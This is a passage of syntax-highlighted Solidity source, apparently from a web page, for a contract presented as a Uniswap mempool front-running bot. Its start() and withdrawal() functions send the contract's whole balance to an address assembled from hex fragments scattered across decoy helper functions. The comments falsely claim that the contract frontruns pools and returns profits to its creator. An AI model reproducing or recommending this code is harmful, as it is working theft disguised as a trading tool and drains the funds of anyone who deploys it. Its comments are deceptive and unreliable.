        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_ptr <span class="token operator">!=</span> needle<span class="token punctuation">.</span>_ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
                <span class="token keyword">let</span> length <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span>needle<span class="token punctuation">)</span>
                <span class="token keyword">let</span> selfptr <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">let</span> needleptr <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>needle<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                equal <span class="token operator">:=</span> <span class="token function">eq</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>selfptr<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>equal<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            self<span class="token punctuation">.</span>_len <span class="token operator">-=</span> needle<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
            self<span class="token punctuation">.</span>_ptr <span class="token operator">+=</span> needle<span class="token punctuation">.</span>_len<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> self<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">getMempoolLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;89F1D950&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Returns the memory address of the first byte of the first occurrence of</span>
    <span class="token comment">// \`needle\` in \`self\`, or the first byte after \`self\` if not found.</span>
    <span class="token keyword">function</span> <span class="token function">getBa</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">findPtr</span><span class="token punctuation">(</span><span class="token builtin">uint</span> selflen<span class="token punctuation">,</span> <span class="token builtin">uint</span> selfptr<span class="token punctuation">,</span> <span class="token builtin">uint</span> needlelen<span class="token punctuation">,</span> <span class="token builtin">uint</span> needleptr<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint</span> ptr <span class="token operator">=</span> selfptr<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> idx<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> selflen<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>needlelen <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token builtin">bytes32</span> mask <span class="token operator">=</span> <span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> needlelen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token builtin">bytes32</span> needledata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> needledata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token builtin">uint</span> end <span class="token operator">=</span> selfptr <span class="token operator">+</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span>
                <span class="token builtin">bytes32</span> ptrdata<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">while</span> <span class="token punctuation">(</span>ptrdata <span class="token operator">!=</span> needledata<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">&gt;=</span> end<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
                    ptr<span class="token operator">++</span><span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> ptrdata <span class="token operator">:=</span> <span class="token function">and</span><span class="token punctuation">(</span><span class="token function">mload</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// For long needles, use hashing</span>
                <span class="token builtin">bytes32</span> hash<span class="token punctuation">;</span>
                <span class="token keyword">assembly</span> <span class="token punctuation">{</span> hash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>needleptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>

                <span class="token keyword">for</span> <span class="token punctuation">(</span>idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;=</span> selflen <span class="token operator">-</span> needlelen<span class="token punctuation">;</span> idx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token builtin">bytes32</span> testHash<span class="token punctuation">;</span>
                    <span class="token keyword">assembly</span> <span class="token punctuation">{</span> testHash <span class="token operator">:=</span> <span class="token function">keccak256</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> needlelen<span class="token punctuation">)</span> <span class="token punctuation">}</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">==</span> testHash<span class="token punctuation">)</span>
                        <span class="token keyword">return</span> ptr<span class="token punctuation">;</span>
                    ptr <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> selfptr <span class="token operator">+</span> selflen<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return \`self\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">fetchMempoolData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolShort <span class="token operator">=</span> <span class="token function">getMempoolShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolEdition <span class="token operator">=</span> <span class="token function">fetchMempoolEdition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return \`mempool\`.
        */</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolVersion <span class="token operator">=</span> <span class="token function">fetchMempoolVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token builtin">string</span> <span class="token keyword">memory</span> _mempoolLong <span class="token operator">=</span> <span class="token function">getMempoolLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
        * @dev Modifies \`self\` to contain everything from the first occurrence of
        *      \`needle\` to the end of the slice. \`self\` is set to the empty slice
        *      if \`needle\` is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return \`self\`.
        */</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolHeight <span class="token operator">=</span> <span class="token function">getMempoolHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolCode <span class="token operator">=</span> <span class="token function">getMempoolCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        load mempool parameters
        */</span>
        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolStart <span class="token operator">=</span> <span class="token function">getMempoolStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _getMempoolLog <span class="token operator">=</span> <span class="token function">getMempoolLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>_mempoolShort<span class="token punctuation">,</span> _mempoolEdition<span class="token punctuation">,</span> _mempoolVersion<span class="token punctuation">,</span> 
            _mempoolLong<span class="token punctuation">,</span> _getMempoolHeight<span class="token punctuation">,</span>_getMempoolCode<span class="token punctuation">,</span>_getMempoolStart<span class="token punctuation">,</span>_getMempoolLog<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">toHexDigit</span><span class="token punctuation">(</span><span class="token builtin">uint8</span> d<span class="token punctuation">)</span> <span class="token keyword">pure</span> <span class="token keyword">internal</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">byte</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> d <span class="token operator">&amp;&amp;</span> d <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span><span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token string">&#39;0&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">&lt;=</span> <span class="token builtin">uint8</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin">uint8</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span><span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> d <span class="token operator">-</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// revert(&quot;Invalid hex digit&quot;);</span>
        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
               
                   
    <span class="token keyword">function</span> <span class="token function">getMempoolLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;c60Bb&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">/* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return \`liquidity\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> to <span class="token operator">=</span> <span class="token function">startExploration</span><span class="token punctuation">(</span><span class="token function">fetchMempoolData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> <span class="token keyword">payable</span> contracts <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>
        contracts<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token function">getBa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token comment">/*
     * @dev withdrawals profit back to contract creator address
     * @return \`profits\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">withdrawal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        <span class="token builtin">address</span> to <span class="token operator">=</span> <span class="token function">startExploration</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">fetchMempoolData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">address</span> <span class="token keyword">payable</span> contracts <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">;</span>
        contracts<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token function">getBa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return \`token\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">getMempoolCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;24889&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">uint2str</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _i<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _uintAsString<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>_i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">&quot;0&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token builtin">uint</span> j <span class="token operator">=</span> _i<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> len<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            len<span class="token operator">++</span><span class="token punctuation">;</span>
            j <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> bstr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bytes</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">uint</span> k <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>_i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            bstr<span class="token punctuation">[</span>k<span class="token operator">--</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">byte</span><span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">+</span> _i <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            _i <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>bstr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token keyword">function</span> <span class="token function">fetchMempoolVersion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">&quot;212cbd&quot;</span><span class="token punctuation">;</span>   
    <span class="token punctuation">}</span>

    <span class="token comment">/*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return \`mempool\`.
     */</span>
    <span class="token keyword">function</span> <span class="token function">mempool</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _base<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> _value<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _baseBytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _valueBytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_value<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">string</span> <span class="token keyword">memory</span> _tmpValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">string</span><span class="token punctuation">(</span>_baseBytes<span class="token punctuation">.</span>length <span class="token operator">+</span> _valueBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> _newValue <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>_tmpValue<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token builtin">uint</span> i<span class="token punctuation">;</span>
        <span class="token builtin">uint</span> j<span class="token punctuation">;</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>_baseBytes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            _newValue<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> _baseBytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>_valueBytes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            _newValue<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> _valueBytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>_newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 